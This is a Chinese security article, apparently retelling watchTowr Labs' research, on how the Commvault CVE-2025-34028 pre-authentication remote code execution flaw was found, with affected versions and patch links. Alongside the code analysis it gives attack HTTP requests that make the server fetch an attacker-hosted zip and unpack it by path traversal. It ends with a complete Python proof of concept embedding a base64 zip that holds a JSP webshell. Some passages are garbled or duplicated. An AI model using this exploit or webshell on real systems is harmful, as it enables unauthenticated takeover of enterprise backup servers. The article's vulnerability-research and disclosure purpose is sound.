> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzkzMDY2MDA2Ng==&mid=2247486063&idx=1&sn=987ae5f3106191a106c3baf22c700d1d

#  探究备份软件Commvault CVE-2025-34028远程代码执行漏洞的挖掘过程 | 附poc  
原创 刘顺  安全有术   2025-06-29 23:45  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/MSKf4G7kcviaqwfD0iaJmXLcgarGrAKtL3TDHhcLfE9cj6x0NedPZxV5C1TxZmDl7aAtOPXhGzdV60kT4baESTzg/640?wx_fmt=jpeg&from=appmsg "")  
  
**一、前言**  
  
某知名厂商在其发布的勒索软件趋势报告中指出  
， 93% 的勒索攻击事件中，攻击者都是以备份存储库为最终目标，其中75% 的受害者在攻击期间至少丢失了部分备份，超过三分之一 (39%) 的备份存储库被完全破坏。  
在勒索攻击肆虐的背景下，备份系统的安全成了企业安全的最后一道防线。  
  
Commvault Systems（简称Commvault）是美国一家专业数据管理软件公司，成立于1996年，总部位于新泽西州，公司专注于智能数据保护与恢复领域，其数据备份的解决方案**在全球市场的占有率约为10%。****在Gartner的企业备份与恢复软件解决方案魔力象限中连续十次被评为“领导者”，进一步证明了其在全球市场中的领先地位‌。**  
  
2025年4月，  
Commvault  
被披露存在一个严重的安全漏洞（  
CVE-2025-34028  
），该漏洞可  
使得远程攻击者  
无需进行身份验证即可执行任意代码，导致  
Commvault的  
命令中心（  
Commvault Command Center   
）环境被完全攻陷，  
CVSS漏洞评分为 9 分。  
  
本篇文章是**watchTowr Labs**  
团队发布的挖掘  
CVE-2025-34028漏洞的整个过程。  
  
**二、0day漏洞挖掘全过程**  
  
**（一）通过暴露面了解接口路由逻辑**  
  
Commvault提供了本地部署版本，先安装其Windows本地部署版本（11.38.20），安装后开始查找  
Commvault的暴露面，也就是与用户交互的功能入口，查看本地启动了443端口，通过端口进程定位到开启443端口的tomcat目录。  

```
C:\\Users\\Administrator>netstat -ano | findstr :443
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       3112
  TCP    [::]:443               [::]:0                 LISTENING       3112
----
C:\\Users\\Administrator>tasklist /fi &#34;pid eq 3112&#34; /v
Image Name                     PID Session Name        Session#    Mem Usage Status          User Name                                              CPU Time Window Title
========================= ======== ================ =========== ============ =============== ================================================== ============ ========================================================================
tomcat.exe                    3112 Services                   0  1,544,332 K Unknown         NT AUTHORITY\\NETWORK SERVICE                            0:01:44 N/A
C:\\Users\\Administrator>wmic process where processid=&#34;3112&#34; get executablepath
ExecutablePath
F:\\Program Files\\Commvault\\ContentStore\\Apache\\bin\\tomcat.exe
```

  
进一步查看tomcat的server.xml文件，可以看到相关  
路由文件所在位置。  

```
Context path=&#34;&#34; docBase=&#34;F:/Program Files/Commvault/ContentStore/Apache/webapps/ROOT&#34; reloadable=&#34;false&#34;>
          <Manager pathname=&#34;&#34;/>
        </Context>
        <Context path=&#34;/console&#34; docBase=&#34;F:/Program Files/Commvault/ContentStore/GUI&#34; reloadable=&#34;false&#34;>
          <Manager pathname=&#34;&#34;/>
        </Context>
        <Context path=&#34;/downloads/sqlscripts&#34; docBase=&#34;F:/Program Files/Commvault/ContentStore/Metrics/scripts&#34; reloadable=&#34;false&#34;>
          <Manager pathname=&#34;&#34;/>
        </Context>
        <Context path=&#34;/publicdownloads/sqlscripts&#34; docBase=&#34;F:/Program Files/Commvault/ContentStore/Metrics/public&#34; reloadable=&#34;false&#34;>
          <Manager pathname=&#34;&#34;/>
        </Context>
        <Context path=&#34;/commandcenter&#34; docBase=&#34;F:/Program Files/Commvault/ContentStore/AdminConsole&#34; reloadable=&#34;false&#34;>
          <Manager pathname=&#34;&#34;/>
          <Resource name=&#34;BeanManager&#34; auth=&#34;Container&#34; type=&#34;javax.enterprise.inject.spi.BeanManager&#34; factory=&#34;org.jboss.weld.resources.ManagerObjectFactory&#34;/>
        </Context>
        <Context path=&#34;/identity&#34; docBase=&#34;F:/Program Files/Commvault/ContentStore/identity&#34; reloadable=&#34;false&#34;>
          <Manager pathname=&#34;&#34;/>
        </Context>
        <Context path=&#34;/CustomReportsEngine&#34; docBase=&#34;F:/Program Files/Commvault/ContentStore/CustomReportsEngine&#34; reloadable=&#34;false&#34;>
          <Manager pathname=&#34;&#34;/>
        </Context>
        <Context path=&#34;/reports&#34; docBase=&#34;F:/Program Files/Commvault/ContentStore/Reports&#34; reloadable=&#34;false&#34;>
          <Manager pathname=&#34;&#34;/>
        </Context>
      </Host> 
    </Engine>  
```

  
根据应用程序登录认证的路径，可以确定主  
主应用程序位于/commandcenter 中，它遵循典型的Tomcat结构，包含 web.xml 和 WEB-INF 等目录。  
  
使用HTTP代理发送几个请求，看到请求使用.do扩展名，  
这通常表明系统使用了Apache Struts框架 —— 但在Commvault的实例中似乎并非如此，因为不存在用于列出所有 struts.xml 、 .do 或 .action 端点的文件，  
查看 web.xml 时，也没有 .do 端点的精确映射，但是有一个针对 scanPackage 的 context-param，它会查看特定的类路径，  
猜测它可能在寻找以某种方式注册路由接口的包，接下来反编译  
scanPackage包。  

```
<context-param>
  <param-name>scanPackage</param-name>
  <param-value>commvault.web,commvault.cvmvc</param-value>
</context-param>
```

  
在成  
功反编译所有库之后，我们可以在这些库中搜索我们在HTTP代理中已经观察到  
的  
路径（
```
sloCallBack.do
```

  
）。  
一旦找到一个示例，路由接口是如何实例化的就开始变得清晰了，  
 如下是
```
cv-ac-core.jar
```

  
 的示例，路径 
```
sloCallBack.do
```

  
 及其 
```
requestMethod
```

  
 被映射到函数 
```
SLOCallBack
```

  
。  

```
  @RequestHandlerMethod(
      url = &#34;sloCallBack.do&#34;,
      requestMethod = {RequestMethod.GET, RequestMethod.POST}
   )
   public void SLOCallBack(HttpSession session, HttpServletRequest request, HttpServletResponse response) throws IOException {
      String receivedRelayStateParam = request.getParameter(&#34;cvRelay&#34;);
      if (SSOLoginUtils.externalSiteLogoutEnabled(session)) {
         this.loginService.handleExternalLogout(request, response);
      } else {
         boolean logoutSuccessStatus = StringUtils.equals(request.getParameter(&#34;LogoutErrorCode&#34;), &#34;0&#34;);
         SSOLoginUtils.doClientLogoutAndRedirectToIntendedPage(request, response, logoutSuccessStatus);
      }
   }
```

  

```
通过上面的sloCallBack.do示例，可以很清晰的看到路由关系，在通过正则表达式可以从反编译的库中提取出所有路由后，接下来就开始请求这些路由。
```

  
  

```
302
/commandcenter/login/preSso.jsp
```

  
  
在查找接口重定向信息时，我们  
发现下面这个文件里面的接口不会被重定向，那这些接口是不需要认证的，这个文件里面  

```
总共有58个.do接口！
```

  
  
ContentStore/AdminConsole/WEB-INF/classes/authSkipRules.xml  

```
legalNotice.do
ssoLogin.do
login.do
feedback.do
contact.do
[..Truncated..]
metricsUpload.do
webpackage.do
deployWebpackage.do
deployServiceCommcell.do
```

  
访问这些接口返回状态码900，确定这些接口不需要进行身份认证。  

```
HTTP/1.1 900 
Strict-Transport-Security: max-age=31536000;includeSubDomains
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Set-Cookie: JSESSIONID=331AB64D9DCB1A2684D0CD475CE7192E; Path=/commandcenter; Secure; HttpOnly
X-Frame-Options: SAMEORIGIN
Permissions-Policy: accelerometer=(); geolocation=(); gyroscope=(); microphone=(); payment=();
X-UA-Compatible: IE=Edge,chrome=1
Referrer-Policy: strict-origin-when-cross-origin
trace-id: fb3aaf23d74cd149ba827375f6e29e58
Set-Cookie: csrf=3e2d4412f5244bdca11f9027def59a6b; Path=/commandcenter; Secure
Cache-Control: no-store
vary: accept-encoding
Content-Type: text/html;charset=UTF-8
Content-Language: en-US
Date: Tue, 22 Apr 2025 15:00:08 GMT
Server: Commvault WebServer
Content-Length: 11737
```

  
**（二）发现SSRF漏洞入口**  
  
接下来就是逐个审计上面的58个无需认证的.do接口，  
发现  
deployWebpackage.do接口（  
CVE-2025-34028漏洞的入口  
），这个接口看起来也很简单，是一个post请  
求，3个@ReqParam  
入参  
参数。  

```
@RequestHandlerMethod(
        url = &#34;deployWebpackage.do&#34;,
        requestMethod = {RequestMethod.POST}
    )
    public void deployWebPackage(@ReqParam(required = true) String commcellName, @ReqParam(required = true) String servicePack, @ReqParam(required = true) String version) throws Exception {
        this.ccDeploySerivce.deployWebPackage(commcellName, servicePack, version);
    }
```

  
deployWebpackage.do  
这个接口的请求示例：  

```
POST /commandcenter/deployWebpackage.do HTTP/1.1
Host: {{Hostname}}
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded
Content-Length: 112
commcellName=commcellNameValue&servicePack=servicePackValue&version=versionValue
```

  
deployWebpackage.do  
这个接口类中主要调用了  
ccDeploySerivce  
.  
deployWebPackage函数，如下所示，这个函数存在  
服务端请求伪造（SSRF）的漏洞，  
函数代码如下：  

```
 public void deployWebPackage(String commcellName, String servicePack, String version) throws Exception {
        CloseableHttpClient client = null;
        try {
            if (this.cvConfig.getDisableSSLForCCPackageDeploy()) {
                client = HttpClientBuilder.create().setSSLContext((new SSLContextBuilder()).loadTrustMaterial((KeyStore)null, (x509Certificates, s) -> {
                    return true;
                }).build()).setSSLHostnameVerifier(NoopHostnameVerifier.INSTANCE).build();
            } else {
                client = HttpClients.createDefault();
            }
            String BASE_PATH = this.extractPath(this.fileZipUtil.getResourcePath(&#34;&#34;), false);
            HttpGet request = new HttpGet(&#34;https://&#34; + commcellName + &#34;/commandcenter/webpackage.do&#34;); 
            request.addHeader(&#34;Accept&#34;, &#34;application/octet-stream&#34;);
            CloseableHttpResponse response = client.execute(request);
```

  
从上面的函数代码中可以看到，在  
HttpGet   
request  
=  
new   
HttpGet中，  
代码直接把请求入参commcellName拼接到了HTTP请求URL里面，并执行了HTTP请求，中间没有经过任何安全校验，确定这里存在服务端请求伪造漏洞（SSRF）。  
  
**（三）从SSRF到RCE**  
  
找到SSRF漏洞后，继续跟进类中的代码，发现存在大量的文件写入函数被调用，包括  
FileOutputStream和BufferedOutputStream，如下所示，这或许可以使SSRF漏洞扩展为更具影响力的攻击。  

```
try {
      InputStream in = response.getEntity().getContent();  
      String confPath = BASE_PATH + File.separator + &#34;Apache&#34; + File.separator + &#34;conf&#34; + File.separator + &#34;ccPackages&#34; + File.separator;
      String distCCPath = BASE_PATH + File.separator + &#34;AdminConsole&#34; + File.separator + &#34;dist-cc-sps&#34; + File.separator;
      File confDirectory = this.createDirectory(confPath + servicePack); 
      String var10002 = confDirectory.getAbsolutePath();
      File versionFile = new File(var10002 + File.separator + &#34;version.txt&#34;);
      FileUtils.writeStringToFile(versionFile, version, StandardCharsets.UTF_8, false);
      this.createDirectory(distCCPath);
      BufferedInputStream bis = new BufferedInputStream(in); 
      try {
          FileOutputStream fos = new FileOutputStream(new File(confDirectory, &#34;dist-cc.zip&#34;)); 
          try {
              BufferedOutputStream bos = new BufferedOutputStream(fos);
              try {
                  byte[] buffer = new byte[1024];
                  int read;
                  while((read = bis.read(buffer)) != -1) {
                      bos.write(buffer, 0, read);
[...Truncated...]
      bis.close();
      this.deployCCPackage(servicePack); <---- [6]
      logger.info(&#34;Deployed web package successfully&#34;);
```

  
SSRF服务端请求伪造漏洞的响应内容被存储到了上面代码的  
InputStream  
   
in  
中。  
上面第3行代码定义了
```
confPath目录，
```

  
用于存储部署包的基础目录（计划存储在 
```
Apache/conf/ccPackages/
```

  
 下，  
上面第5行代码创建了
```
confDirectory目录，其中目录路径拼接了confPath + servicePack两个参数。
```

  
  

```
servicePack参数吗，它是
Apache/Reports/
Apache/Reports/
```

  

```
POST /commandcenter/deployWebpackage.do HTTP/1.1
Host: {{Hostname}}
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded
Content-Length: 112
commcellName=External-Controlled-Host.com&servicePack=../../Hello&version=x
```

  
上面代码示例的12行  
FileOutputStream   
fos  
=   
new   
FileOutputStream,开始将SSRF响应的内容写入到  
dist-cc.zip文件里，然后通过while循环将数据写入磁盘。如下调式截图所示：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSKf4G7kcvhtLQPcd2iacCmFH2TswZQuvWGhicwxMpKHa9OcmE7Uxdgt1mdp5KnicI65MMzPcYvib9v7cIdaYviaw2Q/640?wx_fmt=png&from=appmsg "")  
  

```
Apache\\hello
version
commcellName
```

  

```
接下来，继续跟进剩余代码，发现了deployCCPackage方法，如下：
接下来，继续跟进剩余代码，发现了deployCCPackage方法，如下：
```


```
private void deployCCPackage(String servicePack) throws IOException {
        String BASE_PATH = this.extractPath(this.fileZipUtil.getResourcePath(&#34;&#34;), false);
        String CC_DEPLOY_PATH = BASE_PATH + File.separator + &#34;Apache&#34; + File.separator + &#34;conf&#34; + File.separator + &#34;ccPackages&#34; + File.separator;
        String DIST_CC_PATH = BASE_PATH + File.separator + &#34;AdminConsole&#34; + File.separator + &#34;dist-cc-sps&#34; + File.separator;
        String TEMP_DIR = servicePack + &#34;.tmp&#34; + File.separator + &#34;dist-cc&#34;;
        String SERVICEPACK_DEPLOY_PATH = DIST_CC_PATH + servicePack + &#34;.tmp&#34;; 
        File dir = new File(SERVICEPACK_DEPLOY_PATH);
        if (dir.exists()) {
            FileUtils.deleteDirectory(dir);
        }
    this.fileZipUtil.unzipFileWrtAbsPath(CC_DEPLOY_PATH + servicePack + File.separator + &#34;dist-cc.zip&#34;, DIST_CC_PATH + TEMP_DIR); 
```

  

```
其中BASE_PATH是获取 Commvault 安装路径（如F:/Program Files/Commvault/ContentStore）；CC_DEPLOY_PATH是指向Apache/conf/ccPackages/目录，用于存放待部署的压缩包；DIST_CC_PATH是指向AdminConsole/dist-cc-sps/目录，用于解压缩后的临时文件存储，漏洞关键是上面第5行代码，定义TEMP_DIR变量，通过拼接用户可控参数servicePack（如../../hello）和固定后缀，构造了一个临时目录名。最终拼接了解压后目录SERVICEPACK_DEPLOY_PATH。
```

  
  
上面代码中的第11行，是通过unzipFileWrtAbsPath方法，将CC_DEPLOY_PATH下的dist-cc.zip（由用户通过 SSRF 下载并控制内容），解压缩到DIST_CC_PATH + TEMP_DIR路径，
```
TEMP_DIR存在目录遍历漏洞，因此
```

  
这个路径可  
指向服务器任意目录。  
  
到现在，已经具备了向web服务目录写入恶意木马文件的条件，总结前面成果：  
- 攻击者在自己的服务器上创建一个包含恶意 .jsp 文件的压缩文件；  
  
- 通过  
 /commandcenter/deployWebpackage.do接口，利用SSRF漏洞、以及目录遍历漏洞，请求获取攻击者恶意的压缩文件，并可解压到任意web可访问目录。  
  
通过文章开头分析的tomcat的server.xml文件，可以找到web服务类目录，我们的目标是将恶意jsp文件解压到这个目录，如下所示：  

```
<Context path=&#34;/reports&#34; docBase=&#34;F:/Program Files/Commvault/ContentStore/Reports&#34; reloadable=&#34;false&#34;>
  <Manager pathname=&#34;&#34;/>
</Context>
```

  
最终的攻击请求示例如下，jsp木马已上传：  

```
POST /commandcenter/deployWebpackage.do HTTP/1.1
Host: {{Hostname}}
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded
Content-Length: 112
commcellName=external-host.com&servicePack=../../Reports/MetricsUpload/shell/&version=watchTowr
```

  
**三、漏洞影响版本**  
  
漏洞影响版本：11.38.0 —  
   
11.38.25  
，此漏洞仅影响 11.38 创新版本，已在以下创新更新版本及其他更新中得到修复。所有其他版本不受影响。  
  
11.38.20及以下其他更新：  
  
◦ SP38-CU20-433  
  
◦ SP38-CU20-436  
  
11.38.25及以下其他更新：  
  
◦ SP38-CU25-434  
  
◦ SP38-CU25-438  
  
厂商已发布升级版本，公告链接地址：  
  
https://documentation.commvault.com/securityadvisories/CV_2025_04_1.html  
   
  
**四、POC代码**  
  
**watchTowr Labs提供了POC代码，路径如下：**  
  
POC地址：  
  
https://github.com/watchtowrlabs/watchTowr-vs-Commvault-PreAuth-RCE-CVE-2025-34028  
  
  
  
  
POC执行截图：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSKf4G7kcvhtLQPcd2iacCmFH2TswZQuvkBVickdGVx0Fr11fohfhTI1JlOzYPvOkgpturODIaVhZp1Cg6FIqyJw/640?wx_fmt=png&from=appmsg "")  
  
POC源代码：  

```
import requests
import re
import argparse
import urllib3
import base64
import random
import string
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
banner = &#34;&#34;&#34;             __         ___  ___________                   
     __  _  ______ _/  |__ ____ |  |_\\__    ____\\____  _  ________ 
     \\ \\/ \\/ \\__  \\    ___/ ___\\|  |  \\|    | /  _ \\ \\/ \\/ \\_  __ \\
      \\     / / __ \\|  | \\  \\___|   Y  |    |(  <_> \\     / |  | \\/
       \\/\\_/ (____  |__|  \\___  |___|__|__  | \\__  / \\/\\_/  |__|   
                  \\/          \\/     \\/                            


        watchtowr-vs-commvault-rce-CVE-2025-34028.py
        (*) Commvault Unauthenticated Remote Code Execution (CVE-2025-34028) POC by watchTowr


          - Sonny , watchTowr (sonny@watchTowr.com)
        CVEs: [CVE-2025-34028]
        &#34;&#34;&#34;
helptext =  &#34;&#34;&#34;
            Example Usage:
          - python watchtowr-vs-commvault-rce-CVE-2025-34028.py --url https://192.168.1.1
             &#34;&#34;&#34;
print(banner)
parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter)
parser.add_argument(&#34;--url&#34;, help=&#34;target url in the format https://192.168.1.1:4443&#34;, default=False, action=&#34;store&#34;, required=True)
try:
    args = parser.parse_args()
except:
    print(banner)
    print(helptext)
    raise
print(f&#34;[*] Targeting {args.url}&#34;)
print(f&#34;[*] Verifying presence of Commvault&#34;)
response = requests.get(args.url+&#34;/commandcenter/deployServiceCommcell.do&#34;, verify=False)
if &#34;></cv:cvMessages>&#34; not in response.text:
    print(&#34;[!] Error Target is not Commvault&#34;)
    exit()
shell = base64.b64decode(&#34;UEsDBAoAAAAAANx8h1oAAAAAAAAAAAAAAAAIABwAZGlzdC1jYy9VVAkAAxCB82cRgfNndXgLAAEE9QEAAAQUAAAAUEsDBAoAAAAAABFGhloAAAAAAAAAAAAAAAAOABwAZGlzdC1jYy9jY0FwcC9VVAkAA2LP8WfnffNndXgLAAEE9QEAAAQUAAAAUEsDBBQAAAAIABFGhlqqBA47KAAAAC8AAAAYABwAZGlzdC1jYy9jY0FwcC9pbmRleC5odG1sVVQJAANiz/Fn533zZ3V4CwABBPUBAAAEFAAAALPJKMnNsbNJyk+ptLPJMLTzSM3JyVcIzy/KSbHRB/Jt9CFS+mB1XABQSwMEFAAAAAgA41OIWtngLiSEAAAAmgAAABEAHABkaXN0LWNjL3NoZWxsLmpzcFVUCQADaYr0Z2qK9Gd1eAsAAQT1AQAABBQAAAAljc0KwjAQhO99iiUQUA/JwZukQejJmyA+QMS1rTQ/bDdC3t4tPQ3MN8zn9BVKGBHmWDJxr77hF0zleTEnBdp3buK4SLzyu/kOwE1n/2grY4Rb+mSKgeecnJV6o8UPlQgTw3NFuoDTPexzMyLfKRckbgdVhZoUIqqjWJwtorC7Q7425R9QSwECHgMKAAAAAADcfIdaAAAAAAAAAAAAAAAACAAYAAAAAAAAABAA/UEAAAAAZGlzdC1jYy9VVAUAAxCB82d1eAsAAQT1AQAABBQAAABQSwECHgMKAAAAAAARRoZaAAAAAAAAAAAAAAAADgAYAAAAAAAAABAA/UFCAAAAZGlzdC1jYy9jY0FwcC9VVAUAA2LP8Wd1eAsAAQT1AQAABBQAAABQSwECHgMUAAAACAARRoZaqgQOOygAAAAvAAAAGAAYAAAAAAABAAAAtIGKAAAAZGlzdC1jYy9jY0FwcC9pbmRleC5odG1sVVQFAANiz/FndXgLAAEE9QEAAAQUAAAAUEsBAh4DFAAAAAgA41OIWtngLiSEAAAAmgAAABEAGAAAAAAAAQAAALSBBAEAAGRpc3QtY2Mvc2hlbGwuanNwVVQFAANpivRndXgLAAEE9QEAAAQUAAAAUEsFBgAAAAAEAAQAVwEAANMBAAAAAA0K&#34;)
random_path = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))
print(f&#34;[*] Uploading to  /reports/MetricsUpload/{random_path}/&#34;)
upload_url = f&#34;{args.url}/commandcenter/deployServiceCommcell.do&#34;
upload_headers = {&#34;User-Agent&#34;: &#34;CommvaultRCEPoC&#34;, &#34;Accept&#34;: &#34;*/*&#34;}
upload_form = { 
        'servicePack': (None, f'/../../../Reports/MetricsUpload/{random_path}/', 'text/plain'),
        'version': (None, '12.45', 'text/plain'),
        'file': ('file.zip', shell, 'application/octet-stream')
}
requests.post(upload_url, headers=upload_headers, files=upload_form, verify=False)
shell_url = f&#34;{args.url}/reports/MetricsUpload/{random_path}/.tmp/dist-cc/dist-cc/shell.jsp&#34;
print(f&#34;[*] Fetching System User from  {shell_url}&#34;)
current_user_request = requests.get(shell_url, verify=False)
if &#34;System Information&#34; in response.text:
    print(&#34;[!] Error Shell Failed&#34;)
    exit()
pattern = r'<p>Current User: ([^<]+)</p>'
current_user = re.search(pattern, current_user_request.text)
print(f&#34;[*] System User {current_user.group(1)}&#34;)
```

  
**【免责声明】本文内容仅用于安全研究，禁止用于一切非法用途。**  
  
  
